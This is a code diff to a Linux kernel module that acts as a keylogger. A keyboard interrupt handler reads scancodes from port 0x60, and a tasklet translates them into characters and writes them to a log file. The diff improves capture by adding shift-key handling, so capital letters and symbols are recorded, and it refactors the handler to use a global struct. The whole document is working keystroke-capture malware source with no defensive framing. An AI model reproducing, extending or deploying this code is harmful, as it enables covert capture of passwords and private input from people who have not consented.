@@ -77,57 +77,54 @@ int log_write(struct file *fp, unsigned char *data,
 
 void tasklet_logger(unsigned long data)
 {
-	struct logger_data *ldata = (struct logger_data*)data;
 	static int shift = 0;
-
-	printk("ld->scancode = %d\n", ldata->scancode);	
+	
 	/*if(ldata->scancode > 0 && ldata->scancode <= 170){*/
 	if(1){
 		char buf[32];
 		memset(buf, 0, sizeof(buf));
-		switch(ldata->scancode){
+		switch(ld.scancode){
 			default: 
-				/*sprintf(buf, "[%d]", ldata->scancode);*/
-				break;
+				return;
 
 			case 1:
 				strcpy(buf, "(ESC)"); break;
 
 			case 2:
-				strcpy(buf, "1"); break;
+				strcpy(buf, (shift) ? "!" : "1"); break;
 
 			case 3:
-				strcpy(buf, "2"); break;
+				strcpy(buf, (shift) ? "@" : "2"); break;
 	
 			case 4:
-				strcpy(buf, "3"); break;
+				strcpy(buf, (shift) ? "#" : "3"); break;
 			
 			case 5:
-				strcpy(buf, "4"); break;
+				strcpy(buf, (shift) ? "$" : "4"); break;
 
 			case 6:
-				strcpy(buf, "5"); break;
+				strcpy(buf, (shift) ? "%" : "5"); break;
 
 			case 7:
-				strcpy(buf, "6"); break;
+				strcpy(buf, (shift) ? "^" : "6"); break;
 
 			case 8:
-				strcpy(buf, "7"); break;
+				strcpy(buf, (shift) ? "&" : "7"); break;
 
 			case 9:
-				strcpy(buf, "8"); break;
+				strcpy(buf, (shift) ? "*" : "8"); break;
 
 			case 10:
-				strcpy(buf, "9"); break;
+				strcpy(buf, (shift) ? "(" : "9"); break;
 
 			case 11:
-				strcpy(buf, "0"); break;
+				strcpy(buf, (shift) ? ")" : "0"); break;
 
 			case 12:
-				strcpy(buf, "-"); break;
+				strcpy(buf, (shift) ? "_" : "-"); break;
 
 			case 13:
-				strcpy(buf, "="); break;
+				strcpy(buf, (shift) ? "+" : "="); break;
 
 			case 14:
 				strcpy(buf, "(BACK)"); break;
@@ -136,40 +133,40 @@ void tasklet_logger(unsigned long data)
 				strcpy(buf, "(TAB)"); break;
 
 			case 16:
-				strcpy(buf, "q"); break;
+				strcpy(buf, (shift) ? "Q" : "q"); break;
 
 			case 17:
-				strcpy(buf, "w"); break;
+				strcpy(buf, (shift) ? "W" : "w"); break;
 
 			case 18:
-				strcpy(buf, "e"); break;
+				strcpy(buf, (shift) ? "E" : "e"); break;
 
 			case 19:
-				strcpy(buf, "r"); break;
+				strcpy(buf, (shift) ? "R" : "r"); break;
 
 			case 20:
-				strcpy(buf, "t"); break;
+				strcpy(buf, (shift) ? "T" : "t"); break;
 
 			case 21:
-				strcpy(buf, "y"); break;
+				strcpy(buf, (shift) ? "Y" : "y"); break;
 
 			case 22:
-				strcpy(buf, "u"); break;
+				strcpy(buf, (shift) ? "U" : "u"); break;
 
 			case 23:
-				strcpy(buf, "i"); break;
+				strcpy(buf, (shift) ? "I" : "i"); break;
 
 			case 24:
-				strcpy(buf, "o"); break;
+				strcpy(buf, (shift) ? "O" : "o"); break;
 
 			case 25:
-				strcpy(buf, "p"); break;
+				strcpy(buf, (shift) ? "P" : "p"); break;
 
 			case 26:
-				strcpy(buf, "["); break;
+				strcpy(buf, (shift) ? "{" : "["); break;
 
 			case 27:
-				strcpy(buf, "]"); break;
+				strcpy(buf, (shift) ? "}" : "]"); break;
 
 			case 28:
 				strcpy(buf, "(ENTER)"); break;
@@ -184,76 +181,72 @@ void tasklet_logger(unsigned long data)
 				strcpy(buf, (shift) ? "S" : "s"); break;
 
 			case 32:
-				strcpy(buf, "d"); break;
+				strcpy(buf, (shift) ? "D" : "d"); break;
 
 			case 33:
-				strcpy(buf, "f"); break;
+				strcpy(buf, (shift) ? "F" : "f"); break;
 		
 			case 34:
-				strcpy(buf, "g"); break;
+				strcpy(buf, (shift) ? "G" : "g"); break;
 
 			case 35:
-				strcpy(buf, "h"); break;
+				strcpy(buf, (shift) ? "H" : "h"); break;
 
 			case 36:
-				strcpy(buf, "j"); break;
+				strcpy(buf, (shift) ? "J" : "j"); break;
 
 			case 37:
-				strcpy(buf, "k"); break;
+				strcpy(buf, (shift) ? "K" : "k"); break;
 	
 			case 38:
-				strcpy(buf, "l"); break;
+				strcpy(buf, (shift) ? "L" : "l"); break;
 		
 			case 39:
-				strcpy(buf, ";"); break;
+				strcpy(buf, (shift) ? ":" : ";"); break;
 
 			case 40:
-				strcpy(buf, "'"); break;
+				strcpy(buf, (shift) ? "\"" : "'"); break;
 	
 			case 41:
-				strcpy(buf, "`"); break;
+				strcpy(buf, (shift) ? "~" : "`"); break;
 
 			case 42:
-				/*strcpy(buf, "(SHIFT-PRESSED)"); break;	*/
+			case 54:
 				shift = 1; break;
 
 			case 170:
-				/*strcpy(buf, "(SHIFT-RELEASED)"); break;*/
+			case 182:
 				shift = 0; break;
 	
 			case 44:
-				strcpy(buf, "z"); break;
+				strcpy(buf, (shift) ? "Z" : "z"); break;
 			
 			case 45:
-				strcpy(buf, "x"); break;
+				strcpy(buf, (shift) ? "X" : "x"); break;
 
 			case 46:
-				strcpy(buf, "c"); break;
+				strcpy(buf, (shift) ? "C" : "c"); break;
 
 			case 47:
-				strcpy(buf, "v"); break;
+				strcpy(buf, (shift) ? "V" : "v"); break;
 			
 			case 48:
-				strcpy(buf, "b"); break;
+				strcpy(buf, (shift) ? "B" : "b"); break;
 	
 			case 49:
-				strcpy(buf, "n"); break;
+				strcpy(buf, (shift) ? "N" : "n"); break;
 
 			case 50:
-				strcpy(buf, "m"); break;
+				strcpy(buf, (shift) ? "M" : "m"); break;
 
 			case 51:
-				strcpy(buf, ","); break;
+				strcpy(buf, (shift) ? "<" : ","); break;
 
 			case 52:
-				strcpy(buf, "."); break;
+				strcpy(buf, (shift) ? ">" : "."); break;
 		
 			case 53:
-				strcpy(buf, "/"); break;
-	
-			case 54:
-				
-				strcpy(buf, "(R-SHIFT)"); break;
+				strcpy(buf, (shift) ? "?" : "/"); break;
 
 			case 56:
 				strcpy(buf, "(R-ALT"); break;
@@ -288,9 +281,7 @@ DECLARE_TASKLET(my_tasklet, tasklet_logger, (unsigned long)&ld);
 
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 {
-	struct logger_data *ldata = (struct logger_data*)dev_id;
-
-	ldata->scancode = inb(0x60);
+	ld.scancode = inb(0x60);
 
 	tasklet_schedule(&my_tasklet);
 	/* TODO:
@@ -328,8 +319,6 @@ static int __init kb_init(void)
 		memset(buf, 0, sizeof(buf));
 		strcpy(buf, "-LOG START-\n\n");
 		log_write(log_fp, buf, sizeof(buf));
-		/*logger = kthread_run(&kthread_log_keystrokes, NULL, "keylogger");
-		printk("KERNEL THREAD: %s\n", logger->comm);		*/
 	}
 
 	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
@@ -354,4 +343,4 @@ MODULE_LICENSE("GPL");
 module_init(kb_init);
 module_exit(kb_exit);
 
-/* EXPORT_NO_SYMBOLS; */
+EXPORT_NO_SYMBOLS;
